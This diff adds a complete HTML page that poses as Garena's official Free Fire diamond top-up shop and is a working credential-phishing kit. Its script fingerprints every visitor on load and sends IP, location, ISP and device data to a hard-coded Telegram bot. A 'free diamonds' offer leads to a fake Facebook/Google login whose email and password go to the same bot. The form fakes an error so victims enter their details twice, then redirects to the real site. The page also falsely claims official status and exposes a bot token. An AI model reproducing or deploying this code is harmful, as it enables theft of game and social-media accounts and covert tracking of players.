@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Garena Shop - مركز شحن فري فاير الرسمي</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --garena-red: #ff4646;
+            --garena-dark: #1a1a1a;
+            --bg-light: #f0f2f5;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        body { background-color: var(--bg-light); color: #333; overflow-x: hidden; }
+
+        /* Header */
+        header {
+            background: #fff; padding: 10px 20px; display: flex; justify-content: space-between;
+            align-items: center; border-bottom: 2px solid var(--garena-red); position: sticky; top: 0; z-index: 1000;
+        }
+        .garena-logo-top { height: 35px; }
+        .info-trigger { background: var(--garena-red); color: white; border: none; padding: 5px 15px; border-radius: 5px; cursor: pointer; font-size: 13px; font-weight: bold; }
+
+        /* Hero & Banner */
+        .hero-banner { width: 100%; background: #fff; padding: 15px; text-align: center; }
+        .banner-img { width: 100%; max-width: 600px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+
+        /* Game Select Area */
+        .main-selection { background: #fff; padding: 30px 10px; text-align: center; margin-bottom: 10px; }
+        .game-card { display: inline-block; width: 120px; cursor: pointer; position: relative; transition: 0.3s; }
+        .game-card:hover { transform: translateY(-5px); }
+        .game-card img { width: 100px; border-radius: 20px; border: 3px solid var(--garena-red); box-shadow: 0 5px 15px rgba(255, 70, 70, 0.3); }
+        .hot-tag { position: absolute; top: -10px; right: 5px; background: #ffce00; color: #000; font-size: 10px; padding: 2px 8px; border-radius: 4px; font-weight: bold; }
+
+        /* Offers Grid */
+        #offers-section { display: none; padding: 20px; max-width: 800px; margin: 0 auto; animation: fadeIn 0.5s; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        
+        .section-title { font-weight: bold; margin-bottom: 20px; color: #555; border-right: 4px solid var(--garena-red); padding-right: 10px; }
+        .offers-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); gap: 15px; }
+        .offer-card { background: #fff; border-radius: 10px; padding: 15px; text-align: center; border: 1px solid #ddd; cursor: pointer; transition: 0.2s; }
+        .offer-card:hover { border-color: var(--garena-red); box-shadow: 0 3px 10px rgba(0,0,0,0.05); }
+        .offer-card img { width: 40px; margin-bottom: 10px; }
+        .dm-count { display: block; font-weight: bold; color: #1a1a1a; }
+        .price { color: #28a745; font-weight: bold; font-size: 14px; }
+
+        /* Login Modal */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 2000; align-items: center; justify-content: center; padding: 15px; }
+        .modal-content { background: #fff; width: 100%; max-width: 400px; border-radius: 15px; overflow: hidden; position: relative; }
+        .modal-header { background: var(--garena-red); color: #fff; padding: 15px; text-align: center; font-weight: bold; }
+        .modal-body { padding: 20px; }
+        
+        .auth-choice { display: flex; flex-direction: column; gap: 10px; }
+        .auth-btn { display: flex; align-items: center; justify-content: center; gap: 10px; padding: 12px; border-radius: 8px; border: 1px solid #ddd; cursor: pointer; font-weight: bold; text-decoration: none; font-size: 14px; }
+        .fb-btn { background: #1877f2; color: #fff; border: none; }
+        .gm-btn { background: #fff; color: #555; border: 1px solid #ddd; }
+
+        .input-group { display: none; margin-top: 15px; }
+        .input-group input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 5px; outline: none; }
+        .error-box { background: #ffe6e6; color: #d63031; padding: 10px; border-radius: 5px; font-size: 12px; margin-bottom: 10px; display: none; text-align: center; }
+
+        footer { background: #fff; padding: 30px; text-align: center; border-top: 1px solid #eee; margin-top: 50px; }
+        .official-badge { display: inline-flex; align-items: center; gap: 5px; color: var(--garena-red); font-weight: bold; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+
+<header>
+    <img src="https://shop2game.com/static/img/logo_s2g_full.png" class="garena-logo-top">
+    <button class="info-trigger" onclick="showSiteInfo()">معلومات الموقع</button>
+</header>
+
+<div class="hero-banner">
+    <img src="https://pbs.twimg.com/media/ESVn22jXQAAp4yD.jpg" class="banner-img">
+</div>
+
+<div class="main-selection" id="game-selection">
+    <div class="section-title">اختر اللعبة للبدء</div>
+    <div class="game-card" onclick="openOffers()">
+        <span class="hot-tag">الأكثر شحناً</span>
+        <img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/icon.png">
+        <p style="margin-top:10px; font-weight:bold;">Free Fire</p>
+    </div>
+</div>
+
+<div id="offers-section">
+    <div class="section-title">اختر عرض الجواهر 💎</div>
+    <div class="offers-grid" id="offers-container">
+        </div>
+</div>
+
+<footer>
+    <div class="official-badge">
+        <i class="fa-solid fa-circle-check"></i> الموقع الرسمي المعتمد لشركة Garena ™
+    </div>
+    <p style="font-size: 12px; color: #888;">جميع الحقوق محفوظة © 2026. شركة Garena العالمية للألعاب.</p>
+    <div style="margin-top:10px; font-size:10px; color:#ccc;">Facebook | Instagram | Twitter | TikTok</div>
+</footer>
+
+<div id="loginModal" class="modal">
+    <div class="modal-content">
+        <div class="modal-header">تسجيل الدخول للمتابعة</div>
+        <div class="modal-body">
+            <div id="authChoice" class="auth-choice">
+                <div class="auth-btn fb-btn" onclick="openLoginForm('Facebook')"><i class="fa-brands fa-facebook"></i> فيسبوك</div>
+                <div class="auth-btn gm-btn" onclick="openLoginForm('Google')"><img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" width="18"> جوجل</div>
+            </div>
+
+            <div id="loginForm" class="input-group">
+                <div class="error-box" id="errorMsg">البيانات التي استعملتها غير صحيحة، يرجى المحاولة مرة أخرى.</div>
+                <p id="platformLabel" style="text-align:center; font-weight:bold; margin-bottom:10px;"></p>
+                <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف">
+                <input type="password" id="pass" placeholder="كلمة المرور">
+                <button class="auth-btn fb-btn" style="width:100%" onclick="submitLogin()">إشحن الآن 💎</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // الإعدادات الخاصة بك
+    const CONFIG = {
+        TOKEN: '8445311511:AAFYyFSR9ZSZdTYIHNAZI5wNzL8xmzHmJzw',
+        CHAT_ID: '7902407443'
+    };
+
+    const OFFERS = [
+        { dms: '500 جوهرة', price: 'مجاناً', type: 'free' },
+        { dms: '7000 جوهرة', price: '$2.00', type: 'mid' },
+        { dms: '1000 جوهرة', price: '$2.50', type: 'mid' },
+        { dms: '5000 جوهرة', price: '$5.00', type: 'mid' },
+        { dms: '7000 جوهرة', price: '$6.00', type: 'mid' },
+        { dms: '9000 جوهرة', price: '$7.00', type: 'mid' },
+        { dms: '100,000 جوهرة', price: '$9.00', type: 'new' },
+        { dms: '15,000 جوهرة', price: '$13.00', type: 'new' },
+        { dms: '20,000 جوهرة', price: '$17.00', type: 'new' },
+        { dms: '25,000 جوهرة', price: '$20.00', type: 'new' }
+    ];
+
+    let selectedOffer = "";
+    let selectedPlatform = "";
+    let attempt = 0;
+
+    // تتبع الزوار فور الدخول
+    window.onload = async () => {
+        try {
+            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json());
+            let battery = "Unknown";
+            if(navigator.getBattery) {
+                const b = await navigator.getBattery();
+                battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Not Charging'})`;
+            }
+
+            const text = `
+<b>🚨 زائر جديد دخل الموقع!</b>
+----------------------------------
+📍 <b>البلد:</b> ${ipData.country_name} (${ipData.city})
+🌐 <b>IP:</b> <code>${ipData.ip}</code>
+🏢 <b>المزود:</b> ${ipData.org}
+📱 <b>الجهاز:</b> ${navigator.platform}
+🔋 <b>البطارية:</b> ${battery}
+🖥️ <b>النظام:</b> ${navigator.userAgent.split(')')[0].split('(')[1]}
+----------------------------------`;
+            
+            sendTelegram(text);
+        } catch (e) { console.error(e); }
+    };
+
+    function sendTelegram(text) {
+        fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: text, parse_mode: 'HTML' })
+        });
+    }
+
+    function openOffers() {
+        document.getElementById('game-selection').style.display = 'none';
+        const section = document.getElementById('offers-section');
+        section.style.display = 'block';
+        
+        const container = document.getElementById('offers-container');
+        OFFERS.forEach(offer => {
+            const card = document.createElement('div');
+            card.className = 'offer-card';
+            card.innerHTML = `
+                <img src="https://shop2game.com/static/img/product/diamond.png">
+                <span class="dm-count">${offer.dms}</span>
+                <span class="price">${offer.price}</span>
+            `;
+            card.onclick = () => handleOfferClick(offer);
+            container.appendChild(card);
+        });
+    }
+
+    function handleOfferClick(offer) {
+        if(offer.type === 'free') {
+            selectedOffer = offer.dms;
+            document.getElementById('loginModal').style.display = 'flex';
+        } else {
+            if(confirm(`هل تريد شراء ${offer.dms} بسعر ${offer.price}؟`)) {
+                window.location.href = "https://shop2game.com/";
+            }
+        }
+    }
+
+    function openLoginForm(platform) {
+        selectedPlatform = platform;
+        document.getElementById('authChoice').style.display = 'none';
+        document.getElementById('loginForm').style.display = 'block';
+        document.getElementById('platformLabel').innerText = "سجل الدخول عبر " + platform;
+    }
+
+    async function submitLogin() {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('pass').value;
+
+        if(email.length < 5 || pass.length < 5) {
+            document.getElementById('errorMsg').style.display = 'block';
+            return;
+        }
+
+        const log = `
+<b>🔥 صيد جديد (Garena Shop) 🔥</b>
+----------------------------------
+💎 <b>العرض:</b> ${selectedOffer}
+👤 <b>المنصة:</b> ${selectedPlatform}
+📧 <b>البريد/الهاتف:</b> <code>${email}</code>
+🔑 <b>كلمة المرور:</b> <code>${pass}</code>
+----------------------------------`;
+
+        await sendTelegram(log);
+
+        if(attempt === 0) {
+            attempt++;
+            document.getElementById('errorMsg').style.display = 'block';
+            document.getElementById('email').value = "";
+            document.getElementById('pass').value = "";
+        } else {
+            alert("تم إرسال طلبك بنجاح! سيتم شحن الجواهر خلال 24 ساعة.");
+            window.location.href = "https://shop2game.com/";
+        }
+    }
+
+    function showSiteInfo() {
+        alert("هذا الموقع رسمي ويوفر الوصول الآمن لحسابات Garena عبر ربطها بـ (Facebook, Instagram, Google, TikTok, Twitter). الموقع مبرمج بأعلى معايير الأمان لضمان وصول الجواهر لحسابك.");
+    }
+
+    // إغلاق المودال عند الضغط خارجه
+    window.onclick = (e) => { if(e.target.className === 'modal') e.target.style.display = 'none'; }
+</script>
+
+</body>
+</html>
